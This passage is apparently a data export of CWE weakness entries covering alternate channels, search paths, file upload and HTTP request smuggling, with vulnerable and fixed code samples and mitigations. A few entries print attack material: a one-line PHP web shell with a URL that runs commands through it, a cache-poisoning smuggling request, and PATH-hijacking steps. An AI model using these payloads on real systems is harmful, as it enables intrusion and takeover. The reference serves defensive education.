CWE CATEGORY: Communication Channel Errors,"Weaknesses in this category are related to improper handling of communication channels and access paths. These weaknesses include problems in creating, managing, or removing alternate channels and alternate paths. Some of these can overlap virtual file problems and are commonly used in ""bypass"" attacks, such as those that exploit authentication errors.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: DEPRECATED: Channel Errors,This category has been deprecated because it redundant with the grouping provided byCWE-417.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-419: Unprotected Primary Channel,"The product uses a primary channel for administration or restricted functionality, but it does not properly protect the channel.","Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume Identity; Bypass Protection Mechanism, Likelihood: ",无示范例子,Phase:  Architecture and DesignDo not expose administrative functionnality on the user UI.Phase:  Architecture and DesignProtect the administrative/restricted functionality with a strong authentication mechanism.
CWE-420: Unprotected Alternate Channel,"The product protects a primary channel, but it does not use the same level of protection for an alternate channel.","Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume Identity; Bypass Protection Mechanism, Likelihood: ","Example 1Register SECURE_ME is located at address 0xF00. A
                 mirror of this register called COPY_OF_SECURE_ME is
                 at location 0x800F00. The register SECURE_ME is
                 protected from malicious agents and only allows
                 access to select, while COPY_OF_SECURE_ME is not.Access control is implemented using an allowlist (as
                 indicated by acl_oh_allowlist). The identity of the
                 initiator of the transaction is indicated by the
                 one hot input, incoming_id. This is checked against
                 the acl_oh_allowlist (which contains a list of
                 initiators that are allowed to access the asset).Though this example is shown in Verilog, it will
                 apply to VHDL as well.(informative)Example Language:Verilogmodule foo_bar(data_out, data_in, incoming_id, address, clk, rst_n);output [31:0] data_out;input [31:0] data_in, incoming_id, address;input clk, rst_n;wire write_auth, addr_auth;reg [31:0] data_out, acl_oh_allowlist, q;assign write_auth = | (incoming_id & acl_oh_allowlist) ? 1 : 0;always @*acl_oh_allowlist <= 32'h8312;assign addr_auth = (address == 32'hF00) ? 1: 0;always @ (posedge clk or negedge rst_n)if (!rst_n)beginq <= 32'h0;data_out <= 32'h0;endelsebeginq <= (addr_auth & write_auth) ? data_in: q;data_out <= q;endendendmodule(bad code)Example Language:Verilogassign addr_auth = (address == 32'hF00) ? 1: 0;The bugged line of code is repeated in the Bad
             example above. The weakness arises from the fact that the
             SECURE_ME register can be modified by writing to the
             shadow register COPY_OF_SECURE_ME. The address of
             COPY_OF_SECURE_ME should also be included in the check.
             That buggy line of code should instead be replaced as
             shown in the Good Code Snippet below.(good code)Example Language:Verilogassign addr_auth = (address == 32'hF00 || address == 32'h800F00) ? 1: 0;",Phase:  Architecture and DesignIdentify all alternate channels and use the same protection mechanisms that are used for the primary channels.
CWE-421: Race Condition During Access to Alternate Channel,"The product opens an alternate channel to communicate with an authorized user, but the channel is accessible to other actors.","Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume Identity; Bypass Protection Mechanism, Likelihood: ",无示范例子,无可能的缓解方案
CWE-422: Unprotected Windows Messaging Channel ('Shatter'),"The product does not properly verify the source of a message in the Windows Messaging System while running at elevated privileges, creating an alternate channel through which an attacker can directly send a message to the product.","Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume Identity; Bypass Protection Mechanism, Likelihood: ",无示范例子,Phase:  Architecture and DesignAlways verify and authenticate the source of the message.
CWE-423: DEPRECATED: Proxied Trusted Channel,This entry has been deprecated because it was a duplicate ofCWE-441. All content has been transferred toCWE-441.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-424: Improper Protection of Alternate Path,The product does not sufficiently protect all possible paths that a user can take to access restricted functionality or resources.,"Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism; Gain Privileges or Assume Identity, Likelihood: ",无示范例子,Phase:  Architecture and DesignDeploy different layers of protection to implement security in depth.
CWE-425: Direct Request ('Forced Browsing'),"The web application does not adequately enforce appropriate authorization on all restricted URLs, scripts, or files.","Scope: ConfidentialityIntegrityAvailabilityAccess Control, Impact: Technical Impact:Read Application Data; Modify Application Data; Execute Unauthorized Code or Commands; Gain Privileges or Assume Identity, Likelihood: ","Example 1If forced browsing is possible, an attacker may be able to directly access a sensitive page by entering a URL similar to the following.(attack code)Example Language:JSPhttp://somesite.com/someapplication/admin.jsp","Phases:  Architecture and Design; OperationApply appropriate access control authorizations for each access to all restricted URLs, scripts or files.Phase:  Architecture and DesignConsider using MVC based frameworks such as Struts."
CWE-426: Untrusted Search Path,The product searches for critical resources using an externally-supplied search path that can point to resources that are not under the product's direct control.,"Scope: IntegrityConfidentialityAvailabilityAccess Control, Impact: Technical Impact:Gain Privileges or Assume Identity; Execute Unauthorized Code or CommandsThere is the potential for arbitrary code execution with privileges of the vulnerable program., Likelihood: ; Scope: Availability, Impact: Technical Impact:DoS: Crash, Exit, or RestartThe program could be redirected to the wrong files, potentially triggering a crash or hang when the targeted file is too large or does not have the expected format., Likelihood: ; Scope: Confidentiality, Impact: Technical Impact:Read Files or DirectoriesThe program could send the output of unauthorized files to the attacker., Likelihood: ","Example 1This program is intended to execute a command that lists the contents of a restricted directory, then performs other actions. Assume that it runs with setuid privileges in order to bypass the permissions check by the operating system.(bad code)Example Language:C#define DIR ""/restricted/directory""char cmd[500];sprintf(cmd, ""ls -l %480s"", DIR);/* Raise privileges to those needed for accessing DIR. */RaisePrivileges(...);system(cmd);DropPrivileges(...);...This code may look harmless at first, since both the directory and the command are set to fixed values that the attacker can't control. The attacker can only see the contents for DIR, which is the intended program behavior. Finally, the programmer is also careful to limit the code that executes with raised privileges.However, because the program does not modify the PATH environment variable, the following attack would work:(attack code)The user sets the PATH to reference a directory under the attacker's control, such as ""/my/dir/"".The attacker creates a malicious program called ""ls"", and puts that program in /my/dirThe user executes the program.When system() is executed, the shell consults the PATH to find the ls programThe program finds the attacker's malicious program, ""/my/dir/ls"". It doesn't find ""/bin/ls"" because PATH does not contain ""/bin/"".The program executes the attacker's malicious program with the raised privileges.Example 2This code prints all of the running processes belonging to the current user.(bad code)Example Language:PHP//assume getCurrentUser() returns a username that is guaranteed to be alphanumeric (avoidingCWE-78)$userName = getCurrentUser();$command = 'ps aux | grep ' . $userName;system($command);If invoked by an unauthorized web user, it is providing a web page of potentially sensitive information on the underlying system, such as command-line arguments (CWE-497). This program is also potentially vulnerable to a PATH based attack (CWE-426), as an attacker may be able to create malicious versions of the ps or grep commands. While the program does not explicitly raise privileges to run the system commands, the PHP interpreter may by default be running with higher privileges than users.Example 3The following code is from a web application that allows users access to an interface through which they can update their password on the system. In this environment, user passwords can be managed using the Network Information System (NIS), which is commonly used on UNIX systems. When performing NIS updates, part of the process for updating passwords is to run a make command in the /var/yp directory. Performing NIS updates requires extra privileges.(bad code)Example Language:Java...System.Runtime.getRuntime().exec(""make"");...The problem here is that the program does not specify an absolute path for make and does not clean its environment prior to executing the call to Runtime.exec(). If an attacker can modify the $PATH variable to point to a malicious binary called make and cause the program to be executed in their environment, then the malicious binary will be loaded instead of the one intended. Because of the nature of the application, it runs with the privileges necessary to perform system operations, which means the attacker's make will now be run with these privileges, possibly giving the attacker complete control of the system.","Phases:  Architecture and Design; ImplementationStrategy:  Attack Surface ReductionHard-code the search path to a set of known-safe values (such as system directories), or only allow them to be specified by the administrator in a configuration file. Do not allow these settings to be modified by an external party. Be careful to avoid related weaknesses such asCWE-426andCWE-428.Phase:  ImplementationWhen invoking other programs, specify those programs using fully-qualified pathnames. While this is an effective approach, code that uses fully-qualified pathnames might not be portable to other systems that do not use the same pathnames. The portability can be improved by locating the full-qualified paths in a centralized, easily-modifiable location within the source code, and having the code refer to these paths.Phase:  ImplementationRemove or restrict all environment settings before invoking other programs. This includes the PATH environment variable, LD_LIBRARY_PATH, and other settings that identify the location of code libraries, and any application-specific search paths.Phase:  ImplementationCheck your search path before use and remove any elements that are likely to be unsafe, such as the current working directory or a temporary files directory.Phase:  ImplementationUse other functions that require explicit paths. Making use of any of the other readily available functions that require explicit paths is a safe way to avoid this problem. For example, system() in C does not require a full path since the shell can take care of it, while execl() and execv() require a full path."
CWE-427: Uncontrolled Search Path Element,"The product uses a fixed or controlled search path to find resources, but one or more locations in that path can be under the control of unintended actors.","Scope: ConfidentialityIntegrityAvailability, Impact: Technical Impact:Execute Unauthorized Code or Commands, Likelihood: ","Example 1The following code is from a web application that allows users access to an interface through which they can update their password on the system. In this environment, user passwords can be managed using the Network Information System (NIS), which is commonly used on UNIX systems. When performing NIS updates, part of the process for updating passwords is to run a make command in the /var/yp directory. Performing NIS updates requires extra privileges.(bad code)Example Language:Java...System.Runtime.getRuntime().exec(""make"");...The problem here is that the program does not specify an absolute path for make and does not clean its environment prior to executing the call to Runtime.exec(). If an attacker can modify the $PATH variable to point to a malicious binary called make and cause the program to be executed in their environment, then the malicious binary will be loaded instead of the one intended. Because of the nature of the application, it runs with the privileges necessary to perform system operations, which means the attacker's make will now be run with these privileges, possibly giving the attacker complete control of the system.Example 2In versions of Go prior to v1.19, the LookPath function would follow the conventions of the runtime OS and look for a program in the directiories listed in the current path [REF-1325].Therefore, Go would prioritize searching the current directory when the provided command name does not contain a directory separator and continued to search for programs even when the specified program name is empty.Consider the following where an application executes a git command to run on the system.(bad code)Example Language:Gofunc ExecuteGitCommand(name string, arg []string) error {c := exec.Command(name, arg...)var err errorc.Path, err = exec.LookPath(name)if err != nil {return err}}An attacker could create a malicious repository with a file named ..exe and another file named git.exe. If git.exe is not found in the system PATH, then ..exe would execute [REF-1326].Example 3In February 2021 [REF-1169], a researcher was able to demonstrate the ability to breach major technology companies by using ""dependency confusion"" where the companies would download and execute untrusted packages.The researcher discovered the names of some internal, private packages by looking at dependency lists in public source code, such as package.json. The researcher then created new, untrusted packages with the same name as the internal packages, then uploaded them to package hosting services. These services included the npm registry for Node, PyPi for Python, and RubyGems. In affected companies, their dependency resolution would search the public hosting services first before consulting their internal service, causing the untrusted packages to be automatically downloaded and executed.","Phases:  Architecture and Design; ImplementationStrategy:  Attack Surface ReductionHard-code the search path to a set of known-safe values (such as system directories), or only allow them to be specified by the administrator in a configuration file. Do not allow these settings to be modified by an external party. Be careful to avoid related weaknesses such asCWE-426andCWE-428.Phase:  ImplementationStrategy:  Attack Surface ReductionWhen invoking other programs, specify those programs using fully-qualified pathnames. While this is an effective approach, code that uses fully-qualified pathnames might not be portable to other systems that do not use the same pathnames. The portability can be improved by locating the full-qualified paths in a centralized, easily-modifiable location within the source code, and having the code refer to these paths.Phase:  ImplementationStrategy:  Attack Surface ReductionRemove or restrict all environment settings before invoking other programs. This includes the PATH environment variable, LD_LIBRARY_PATH, and other settings that identify the location of code libraries, and any application-specific search paths.Phase:  ImplementationCheck your search path before use and remove any elements that are likely to be unsafe, such as the current working directory or a temporary files directory. Since this is a denylist approach, it might not be a complete solution.Phase:  ImplementationUse other functions that require explicit paths. Making use of any of the other readily available functions that require explicit paths is a safe way to avoid this problem. For example, system() in C does not require a full path since the shell can take care of finding the program using the PATH environment variable, while execl() and execv() require a full path."
CWE-428: Unquoted Search Path or Element,"The product uses a search path that contains an unquoted element, in which the element contains whitespace or other separators. This can cause the product to access resources in a parent path.","Scope: ConfidentialityIntegrityAvailability, Impact: Technical Impact:Execute Unauthorized Code or Commands, Likelihood: ","Example 1The following example demonstrates the weakness.(bad code)Example Language:CUINT errCode = WinExec( ""C:\\Program Files\\Foo\\Bar"", SW_SHOW );","Phase:  ImplementationProperly quote the full search path before executing a program on the system.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE CATEGORY: Handler Errors,Weaknesses in this category are related to improper management of handlers.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-430: Deployment of Wrong Handler,"The wrong ""handler"" is assigned to process an object.","Scope: IntegrityOther, Impact: Technical Impact:Varies by Context; Unexpected State, Likelihood: ",无示范例子,"Phase:  Architecture and DesignPerform a type check before interpreting an object.Phase:  Architecture and DesignReject any inconsistent types, such as a file with a .GIF extension that appears to consist of PHP code."
CWE-431: Missing Handler,A handler is not available or implemented.,"Scope: Other, Impact: Technical Impact:Varies by Context, Likelihood: ","Example 1If a Servlet does not catch all exceptions, it may reveal debugging information that will help an adversary form a plan of attack. In the following method a DNS lookup failure will cause the Servlet to throw an exception.(bad code)Example Language:Javaprotected void doPost (HttpServletRequest req, HttpServletResponse res) throws IOException {String ip = req.getRemoteAddr();InetAddress addr = InetAddress.getByName(ip);...out.println(""hello "" + addr.getHostName());}When a Servlet throws an exception, the default error response the Servlet container sends back to the user typically includes debugging information. This information is of great value to an attacker.","Phase:  ImplementationHandle all possible situations (e.g. error condition).Phase:  ImplementationIf an operation can throw an Exception, implement a handler for that specific exception."
CWE-432: Dangerous Signal Handler not Disabled During Sensitive Operations,"The product uses a signal handler that shares state with other signal handlers, but it does not properly mask or prevent those signal handlers from being invoked while the original signal handler is still running.","Scope: Integrity, Impact: Technical Impact:Modify Application Data, Likelihood: ",无示范例子,Phase:  ImplementationTurn off dangerous handlers when performing sensitive operations.
CWE-433: Unparsed Raw Web Content Delivery,The product stores raw content or supporting code under the web document root with an extension that is not specifically handled by the server.,"Scope: Confidentiality, Impact: Technical Impact:Read Application Data, Likelihood: ","Example 1The following code uses an include file to store database credentials:database.inc(bad code)Example Language:PHP<?php$dbName = 'usersDB';$dbPassword = 'skjdh#67nkjd3$3$';?>login.php(bad code)Example Language:PHP<?phpinclude('database.inc');$db = connectToDB($dbName, $dbPassword);$db.authenticateUser($username, $password);?>If the server does not have an explicit handler set for .inc files it may send the contents of database.inc to an attacker without pre-processing, if the attacker requests the file directly. This will expose the database name and password.",Phase:  Architecture and DesignPerform a type check before interpreting files.Phase:  Architecture and DesignDo not store sensitive information in files which may be misinterpreted.
CWE-434: Unrestricted Upload of File with Dangerous Type,The product allows the attacker to upload or transfer files of dangerous types that can be automatically processed within the product's environment.,"Scope: IntegrityConfidentialityAvailability, Impact: Technical Impact:Execute Unauthorized Code or CommandsArbitrary code execution is possible if an uploaded file is interpreted and executed as code by the recipient. This is especially true for .asp and .php extensions uploaded to web servers because these file types are often treated as automatically executable, even when file system permissions do not specify execution. For example, in Unix environments, programs typically cannot run unless the execute bit is set, but PHP programs may be executed by the web server without directly invoking them on the operating system., Likelihood: ","Example 1The following code intends to allow a user to upload a picture to the web server. The HTML code that drives the form on the user end has an input field of type ""file"".(good code)Example Language:HTML<form action=""upload_picture.php"" method=""post"" enctype=""multipart/form-data"">Choose a file to upload:<input type=""file"" name=""filename""/><br/><input type=""submit"" name=""submit"" value=""Submit""/></form>Once submitted, the form above sends the file to upload_picture.php on the web server. PHP stores the file in a temporary location until it is retrieved (or discarded) by the server side code. In this example, the file is moved to a more permanent pictures/ directory.(bad code)Example Language:PHP// Define the target location where the picture being// uploaded is going to be saved.$target = ""pictures/"" . basename($_FILES['uploadedfile']['name']);// Move the uploaded file to the new location.if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target)){echo ""The picture has been successfully uploaded."";}else{echo ""There was an error uploading the picture, please try again."";}The problem with the above code is that there is no check regarding type of file being uploaded. Assuming that pictures/ is available in the web document root, an attacker could upload a file with the name:(attack code)malicious.phpSince this filename ends in "".php"" it can be executed by the web server. In the contents of this uploaded file, the attacker could use:(attack code)Example Language:PHP<?phpsystem($_GET['cmd']);?>Once this file has been installed, the attacker can enter arbitrary commands to execute using a URL such as:(attack code)http://server.example.com/upload_dir/malicious.php?cmd=ls%20-lwhich runs the ""ls -l"" command - or any other type of command that the attacker wants to specify.Example 2The following code demonstrates the unrestricted upload of a file with a Java servlet and a path traversal vulnerability. The action attribute of an HTML form is sending the upload file request to the Java servlet.(good code)Example Language:HTML<form action=""FileUploadServlet"" method=""post"" enctype=""multipart/form-data"">Choose a file to upload:<input type=""file"" name=""filename""/><br/><input type=""submit"" name=""submit"" value=""Submit""/></form>When submitted the Java servlet's doPost method will receive the request, extract the name of the file from the Http request header, read the file contents from the request and output the file to the local upload directory.(bad code)Example Language:Javapublic class FileUploadServlet extends HttpServlet {...protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {response.setContentType(""text/html"");PrintWriter out = response.getWriter();String contentType = request.getContentType();// the starting position of the boundary headerint ind = contentType.indexOf(""boundary="");String boundary = contentType.substring(ind+9);String pLine = new String();String uploadLocation = new String(UPLOAD_DIRECTORY_STRING); //Constant value// verify that content type is multipart form dataif (contentType != null && contentType.indexOf(""multipart/form-data"") != -1) {// extract the filename from the Http headerBufferedReader br = new BufferedReader(new InputStreamReader(request.getInputStream()));...pLine = br.readLine();String filename = pLine.substring(pLine.lastIndexOf(""\\""), pLine.lastIndexOf(""\""""));...// output the file to the local upload directorytry {BufferedWriter bw = new BufferedWriter(new FileWriter(uploadLocation+filename, true));for (String line; (line=br.readLine())!=null; ) {if (line.indexOf(boundary) == -1) {bw.write(line);bw.newLine();bw.flush();}} //end of for loopbw.close();} catch (IOException ex) {...}// output successful upload response HTML page}// output unsuccessful upload response HTML pageelse{...}}...}This code does not perform a check on the type of the file being uploaded (CWE-434). This could allow an attacker to upload any executable file or other file with malicious code.Additionally, the creation of the BufferedWriter object is subject to relative path traversal (CWE-23). Since the code does not check the filename that is provided in the header, an attacker can use ""../"" sequences to write to files outside of the intended directory. Depending on the executing environment, the attacker may be able to specify arbitrary files to write to, leading to a wide variety of consequences, from code execution, XSS (CWE-79), or system crash.","Phase:  Architecture and DesignGenerate a new, unique filename for an uploaded file instead of using the user-supplied filename, so that no external input is used at all.[REF-422] [REF-423]Phase:  Architecture and DesignStrategy:  Enforcement by ConversionWhen the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.Phase:  Architecture and DesignConsider storing the uploaded files outside of the web document root entirely. Then, use other mechanisms to deliver the files dynamically. [REF-423]Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.For example, limiting filenames to alphanumeric characters can help to restrict the introduction of unintended file extensions.Phase:  Architecture and DesignDefine a very limited set of allowable extensions and only generate filenames that end in these extensions. Consider the possibility of XSS (CWE-79) before allowing .html or .htm file types.Phase:  ImplementationStrategy:  Input ValidationEnsure that only one extension is used in the filename. Some web servers, including some versions of Apache, may process files based on inner extensions so that ""filename.php.gif"" is fed to the PHP interpreter.[REF-422] [REF-423]Phase:  ImplementationWhen running on a web server that supports case-insensitive filenames, perform case-insensitive evaluations of the extensions that are provided.Phase:  Architecture and DesignFor any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoidCWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.Phase:  ImplementationDo not rely exclusively on sanity checks of file contents to ensure that the file is of the expected type and size. It may be possible for an attacker to hide code in some file segments that will still be executed by the server. For example, GIF images may contain a free-form comments field.Phase:  ImplementationDo not rely exclusively on the MIME content type or filename attribute when determining how to render a file. Validating the MIME content type and ensuring that it matches the extension is only a partial solution.Phases:  Architecture and Design; OperationStrategy:  Environment HardeningRun your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.Phases:  Architecture and Design; OperationStrategy:  Sandbox or JailRun the code in a ""jail"" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.Be careful to avoidCWE-243and other weaknesses related to jails.Effectiveness: LimitedNote:The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed."
CWE-435: Improper Interaction Between Multiple Correctly-Behaving Entities,"An interaction error occurs when two entities have correct behavior when running independently of each other, but when they are integrated as components in a larger system or process, they introduce incorrect behaviors that may cause resultant weaknesses.","Scope: Integrity, Impact: Technical Impact:Unexpected State; Varies by Context, Likelihood: ","Example 1The paper ""Insertion, Evasion, and Denial of Service: Eluding Network Intrusion Detection"" [REF-428] shows that OSes varied widely in how they manage unusual packets, which made it difficult or impossible for intrusion detection systems to properly detect certain attacker manipulations that took advantage of these OS differences.",无可能的缓解方案
CWE-436: Interpretation Conflict,"Product A handles inputs or steps differently than Product B, which causes A to perform incorrect actions based on its perception of B's state.","Scope: IntegrityOther, Impact: Technical Impact:Unexpected State; Varies by Context, Likelihood: ","Example 1The paper ""Insertion, Evasion, and Denial of Service: Eluding Network Intrusion Detection"" [REF-428] shows that OSes varied widely in how they manage unusual packets, which made it difficult or impossible for intrusion detection systems to properly detect certain attacker manipulations that took advantage of these OS differences.Example 2Null characters have different interpretations in Perl and C, which have security consequences when Perl invokes C functions. Similar problems have been reported in ASP [REF-429] and PHP.",无可能的缓解方案
CWE-437: Incomplete Model of Endpoint Features,"A product acts as an intermediary or monitor between two or more endpoints, but it does not have a complete model of an endpoint's features, behaviors, or state, potentially causing the product to perform incorrect actions based on this incomplete model.","Scope: IntegrityOther, Impact: Technical Impact:Unexpected State; Varies by Context, Likelihood: ","Example 1HTTP request smuggling is an attack against an intermediary such as a proxy. This attack works because the proxy expects the client to parse HTTP headers one way, but the client parses them differently.Example 2Anti-virus products that reside on mail servers can suffer from this issue if they do not know how a mail client will handle a particular attachment. The product might treat an attachment type as safe, not knowing that the client's configuration treats it as executable.",无可能的缓解方案
CWE CATEGORY: Behavioral Problems,Weaknesses in this category are related to unexpected behaviors from code that an application uses.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-439: Behavioral Change in New Version or Environment,"A's behavior or functionality changes with a new version of A, or a new environment, which is not known (or manageable) by B.","Scope: Other, Impact: Technical Impact:Quality Degradation; Varies by Context, Likelihood: ",无示范例子,无可能的缓解方案
CWE-440: Expected Behavior Violation,"A feature, API, or function does not perform according to its specification.","Scope: Other, Impact: Technical Impact:Quality Degradation; Varies by Context, Likelihood: ","Example 1The provided code is extracted from the Control and Status Register (CSR), csr_regfile, module within the Hack@DAC'21 OpenPiton System-on-Chip (SoC). This module is designed to implement CSR registers in accordance with the RISC-V specification. The mie (machine interrupt enable) register is a 64-bit register [REF-1384], where bits correspond to different interrupt sources. As the name suggests, mie is a machine-level register that determines which interrupts are enabled. Note that in the example below the mie_q and mie_d registers represent the conceptual mie reigster in the RISC-V specification. The mie_d register is the value to be stored in the mie register while the mie_q register holds the current value of the mie register [REF-1385].The mideleg (machine interrupt delegation) register, also 64-bit wide, enables the delegation of specific interrupt sources from machine privilege mode to lower privilege levels. By setting specific bits in the mideleg register, the handling of certain interrupts can be delegated to lower privilege levels without engaging the machine-level privilege mode. For example, in supervisor mode, the mie register is limited to a specific register called the sie (supervisor interrupt enable) register. If delegated, an interrupt becomes visible in the sip (supervisor interrupt pending) register and can be enabled or blocked using the sie register. If no delegation occurs, the related bits in sip and sie are set to zero.The sie register value is computed based on the current value of mie register, i.e., mie_q, and the mideleg register.(bad code)Example Language:Verilogmodule csr_regfile #(...)(...);...// ---------------------------// CSR Write and update logic// ---------------------------...if (csr_we) beginunique case (csr_addr.address)...riscv::CSR_SIE: begin// the mideleg makes sure only delegate-able register//(and therefore also only implemented registers) are writtenmie_d = (mie_q & ~mideleg_q) | (csr_wdata & mideleg_q) | utval_q;end...endcaseendendmoduleThe above code snippet illustrates an instance of a vulnerable implementation of the sie register update logic, where users can tamper with the mie_d register value through the utval (user trap value) register. This behavior violates the RISC-V specification.The code shows that the value of utval, among other signals, is used in updating the mie_d value within the sie update logic. While utval is a register accessible to users, it should not influence or compromise the integrity of sie. Through manipulation of the utval register, it becomes feasible to manipulate the sie register's value. This opens the door for potential attacks, as an adversary can gain control over or corrupt the sie value. Consequently, such manipulation empowers an attacker to enable or disable critical supervisor-level interrupts, resulting in various security risks such as privilege escalation or denial-of-service attacks.A fix to this issue is to remove the utval from the right-hand side of the assignment. That is the value of the mie_d should be updated as shown in the good code example [REF-1386].(good code)Example Language:Verilogmodule csr_regfile #(...)(...);...// ---------------------------// CSR Write and update logic// ---------------------------...if (csr_we) beginunique case (csr_addr.address)...riscv::CSR_SIE: begin// the mideleg makes sure only delegate-able register//(and therefore also only implemented registers) are writtenmie_d = (mie_q & ~mideleg_q) | (csr_wdata & mideleg_q);end...endcaseendendmodule",无可能的缓解方案
CWE-441: Unintended Proxy or Intermediary ('Confused Deputy'),"The product receives a request, message, or directive from an upstream component, but the product does not sufficiently preserve the original source of the request before forwarding the request to an external actor that is outside of the product's control sphere. This causes the product to appear to be the source of the request, leading it to act as a proxy or other intermediary between the upstream component and the external actor.","Scope: Non-RepudiationAccess Control, Impact: Technical Impact:Gain Privileges or Assume Identity; Hide Activities; Execute Unauthorized Code or Commands, Likelihood: ","Example 1A SoC contains a microcontroller (running ring-3
                     (least trusted ring) code), a Memory Mapped Input Output
                     (MMIO) mapped IP core (containing design-house secrets),
                     and a Direct Memory Access (DMA) controller, among several
                     other compute elements and peripherals. The SoC implements
                     access control to protect the registers in the IP core
                     (which registers store the design-house secrets) from
                     malicious, ring-3 (least trusted ring) code executing on
                     the microcontroller.  The DMA controller, however, is not
                     blocked off from accessing the IP core for functional
                     reasons.(bad code)Example Language:OtherThe code in ring-3 (least trusted ring) of the
                     microcontroller attempts to directly read the protected
                     registers in IP core through MMIO transactions. However,
                     this attempt is blocked due to the implemented access
                     control. Now, the microcontroller configures the DMA core
                     to transfer data from the protected registers to a memory
                     region that it has access to. The DMA core, which is
                     acting as an intermediary in this transaction, does not
                     preserve the identity of the microcontroller and, instead,
                     initiates a new transaction with its own identity. Since
                     the DMA core has access, the transaction (and hence, the
                     attack) is successful.The weakness here is that the intermediary or the
                     proxy agent did not ensure the immutability of the
                     identity of the microcontroller initiating the
                     transaction.(good code)Example Language:OtherThe DMA
                     core forwards this transaction with the identity of the
                     code executing on the microcontroller, which is the
                     original initiator of the end-to-end transaction. Now the
                     transaction is blocked, as a result of forwarding the
                     identity of the true initiator which lacks the permission
                     to access the confidential MMIO mapped IP core.","Phase:  Architecture and DesignEnforce the use of strong mutual authentication mechanism between the two parties.Phase:  Architecture and DesignWhenever a product is an intermediary or proxy for transactions between two other components, the proxy core should not drop the identity of the initiator of the transaction. The immutability of the identity of the initiator must be maintained and should be forwarded all the way to the target."
CWE CATEGORY: DEPRECATED: Web Problems,"This entry has been deprecated. It was originally used for organizing the Development View (CWE-699) and some other views, but it introduced unnecessary complexity and depth to the resulting tree.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-443: DEPRECATED: HTTP response splitting,This weakness can be found atCWE-113.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling'),"The product acts as an intermediary HTTP agent (such as a proxy or firewall) in the data flow between two entities such as a client and server, but it does not interpret malformed HTTP requests or responses in ways that are consistent with how the messages will be processed by those entities that are at the ultimate destination.","Scope: IntegrityNon-RepudiationAccess Control, Impact: Technical Impact:Unexpected State; Hide Activities; Bypass Protection MechanismAn attacker could create HTTP messages to exploit a number of weaknesses including 1) the message can trick the web server to associate a URL with another URL's webpage and caching the contents of the webpage (web cache poisoning attack), 2) the message can be structured to bypass the firewall protection mechanisms and gain unauthorized access to a web application, and 3) the message can invoke a script or a page that returns client credentials (similar to a Cross Site Scripting attack)., Likelihood:","Example 1In the following example, a malformed HTTP request is sent to a website that includes a proxy server and a web server with the intent of poisoning the cache to associate one webpage with another malicious webpage.(attack code)POST http://www.website.com/foobar.html HTTP/1.1Host: www.website.comConnection: Keep-AliveContent-Type: application/x-www-form-urlencodedContent-Length: 0Content-Length: 54GET /poison.html HTTP/1.1Host: www.website.comBla: GET http://www.website.com/page_to_poison.html HTTP/1.1Host: www.website.comConnection: Keep-AliveWhen this request is sent to the proxy server, the proxy server parses the first four lines of the POST request and encounters the two ""Content-Length"" headers. The proxy server ignores the first header, so it assumes the request has a body of length 54 bytes. Therefore, it treats the data in the next three lines that contain exactly 54 bytes as the first request's body:(result)GET /poison.html HTTP/1.1Host: www.website.comBla:The proxy then parses the remaining bytes, which it treats as the client's second request:(attack code)GET http://www.website.com/page_to_poison.html 